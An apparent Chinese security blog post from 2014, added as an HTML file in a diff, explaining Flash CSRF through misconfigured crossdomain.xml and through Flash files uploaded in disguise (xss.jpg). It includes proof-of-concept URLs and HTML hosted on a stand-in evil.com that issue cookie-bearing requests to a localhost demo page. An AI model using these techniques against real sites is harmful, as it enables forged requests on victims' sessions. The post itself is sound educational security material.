@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="robots" content="index,follow" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="author" content="Chu" />
+    <meta name="description" content="Chu 的博客" />
+    <meta name="keywords" content="Chu,网络安全,编程开发" />
+
+    <title>也来聊聊 Flash CSRF - Chu&#39;s BLoG</title>
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/main.ee4a618df935f0a2b9d9e99663fcbefb3605c141a5835bb785b399615d5fac1e.css" integrity="sha256-7kphjfk18KK52emWY/y&#43;&#43;zYFwUGlg1u3hbOZYV1frB4=" />
+    <link rel="alternate" href="/index.xml" type="application/atom+xml" title="RSS" />
+  </head>
+
+  <body>
+    <header></header>
+    <main>
+<article>
+    <header>
+        <h1>也来聊聊 Flash CSRF</h1>
+        <div>
+            <time datetime="2014-05-28 21:19:20 +0800 CST">发布时间: 2014-05-28 21:19</time>
+            <time datetime="2014-06-04 21:19:20 +0800 CST">更新时间: 2014-06-04 21:19</time>
+        </div>
+    </header>
+
+    <section>
+    <p>update 2014/06/04</p>
+<p>这篇文章里面的技巧非常 Nice~</p>
+<p><a href="http://blog.detectify.com/post/86298380233/the-pitfalls-of-allowing-file-uploads-on-your-website">http://blog.detectify.com/post/86298380233/the-pitfalls-of-allowing-file-uploads-on-your-website</a></p>
+<hr>
+<p>看到 ping0s 在 FB 上放出了关于 Flash CSRF 的一些东西，也来聊一聊，just share.</p>
+<p>Flash CSRF 通常是由于 crossdomain.xml 配置不当造成的，利用方法是使用 swf 文件跨域发起请求。当 crossdomain.xml 配置得当时，我们也可以从目标站点发起伪造请求。</p>
+<h2 id="crossdomainxml-配置不当时直接请求">crossdomain.xml 配置不当时直接请求</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;cross-domain-policy&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;allow-access-from</span> <span style="color:#a6e22e">domain=</span><span style="color:#e6db74">&#34;*&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/cross-domain-policy&gt;</span>
+</span></span></code></pre></div><p>上面的 crossdomain.xml 文件配置允任何域的 Flash 对本域发起 HTTP 请求，危害非常大。</p>
+<p>hi.php:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ($_COOKIE[<span style="color:#e6db74">&#39;user&#39;</span>]<span style="color:#f92672">==</span><span style="color:#e6db74">&#39;admin&#39;</span>) {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;hi, admin.&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;you need to login.&#34;</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><p>POC：http://evil.com/xss.swf?a=get&amp;c=http://localhost/hi.php Firebug 下可以看到，我们成功继承浏览器会话，请求了 localhost 域的 hi.php</p>
+<p><img src="something-about-flash-csrf-1.png" alt=""></p>
+<h2 id="crossdomainxml-配置正确从本域-flash-发起请求">crossdomain.xml 配置正确，从本域 Flash 发起请求</h2>
+<p>重新配置crossdomain.xml，限制允许 localhost 域的 Flash 请求。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-xml" data-lang="xml"><span style="display:flex;"><span><span style="color:#75715e">&lt;?xml version=&#34;1.0&#34;?&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;cross-domain-policy&gt;</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&lt;allow-access-from</span> <span style="color:#a6e22e">domain=</span><span style="color:#e6db74">&#34;localhost&#34;</span> <span style="color:#f92672">/&gt;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/cross-domain-policy&gt;</span>
+</span></span></code></pre></div><p>这时我们可以向目标站点上传 Flash 文件，通过 HTML 中的 object 和 embed 标签引用上传的 Flash 发起请求(注意，我们上传的文件不一定是 swf 后缀，和 script 标签类似，不一定要求是 js 后缀。)。POC:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;FlashCSRF POC&lt;/<span style="color:#f92672">title</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">object</span> <span style="color:#a6e22e">classid</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;clsid:d27cdb6e-ae6d-11cf-96b8-444553540000&#34;</span> <span style="color:#a6e22e">codebase</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://fpdownload.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=7,0,0,0&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;500&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;500&#34;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;FlashVars&#34;</span> <span style="color:#a6e22e">align</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;middle&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">paramname</span><span style="color:#960050;background-color:#1e0010">=&#34;</span><span style="color:#a6e22e">allowScriptAccess</span><span style="color:#960050;background-color:#1e0010">&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;always&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">paramname</span><span style="color:#960050;background-color:#1e0010">=&#34;</span><span style="color:#a6e22e">movie</span><span style="color:#960050;background-color:#1e0010">&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://localhost/xss.jpg&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">paramname</span><span style="color:#960050;background-color:#1e0010">=&#34;</span><span style="color:#a6e22e">FlashVars</span><span style="color:#960050;background-color:#1e0010">&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;a=get&amp;c=http://localhost/hi.php&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">paramname</span><span style="color:#960050;background-color:#1e0010">=&#34;</span><span style="color:#a6e22e">quality</span><span style="color:#960050;background-color:#1e0010">&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;high&#34;</span> /&gt;
+</span></span><span style="display:flex;"><span>        &lt;<span style="color:#f92672">embed</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://localhost/xss.jpg&#34;</span> <span style="color:#a6e22e">quality</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;high&#34;</span> <span style="color:#a6e22e">bgcolor</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;#ffffff&#34;</span> <span style="color:#a6e22e">width</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;500&#34;</span> <span style="color:#a6e22e">height</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;500&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;FlashVars&#34;</span> <span style="color:#a6e22e">align</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;middle&#34;</span> <span style="color:#a6e22e">allowScriptAccess</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;always&#34;</span> <span style="color:#a6e22e">FlashVars</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;a=get&amp;c=http://localhost/hi.php&#34;</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;application/x-shockwave-flash&#34;</span> <span style="color:#a6e22e">pluginspage</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.macromedia.com/go/getflashplayer&#34;</span>/&gt;
+</span></span><span style="display:flex;"><span>    <span style="color:#960050;background-color:#1e0010">&lt;</span>/object/&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
+</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">html</span>&gt;
+</span></span></code></pre></div><p><a href="http://evil.com/poc.html">http://evil.com/poc.html</a></p>
+<p><img src="something-about-flash-csrf-2.png" alt=""></p>
+<p>这里的 object 标签内嵌 embed 标签是为了兼容大多数浏览器。通过 Flash 从本域发起的请求可以绕过一些限制，如 referer 等。</p>
+<p>References：</p>
+<ul>
+<li><a href="http://www.80sec.com/csrf-with-flash.html">http://www.80sec.com/csrf-with-flash.html</a></li>
+<li><a href="http://dushii.blog.163.com/blog/static/173051932009413104931351/">http://dushii.blog.163.com/blog/static/173051932009413104931351/</a></li>
+</ul>
+
+    </section>
+</article>
+</main>
+  </body>
+</html>
